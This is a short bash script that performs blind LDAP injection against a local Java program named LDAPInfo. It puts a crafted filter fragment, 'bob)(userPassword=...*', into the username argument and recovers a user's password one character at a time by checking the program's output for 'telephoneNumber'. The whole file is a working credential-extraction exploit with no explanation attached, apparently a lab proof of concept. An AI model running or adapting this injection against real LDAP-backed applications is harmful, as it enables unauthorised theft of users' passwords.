#!/bin/bash
# we just assume that it's that simple
alphabet="qwertyuiopasdfghjklzxcvbnm"

password=""
found=1

# stop when all guesses failed
while [ ${found} -eq 1 ];
do
    found=0
    while read -n1 character; do
        username="bob)(userPassword=${password}${character}*"
        /home/artem/jdk/jdk1.9.0b160/bin/java -cp classes LDAPInfo ${username} > log 2>&1
        if grep telephoneNumber log > /dev/null 2>&1 ; then
            # found next letter
            password="${password}${character}"
            found=1
            echo "password should start with '${password}'"
            break
        fi
    done < <(echo -n "${alphabet}")
done

echo "password: ${password}"


# cleanup
rm -rf log

# root_raj <3

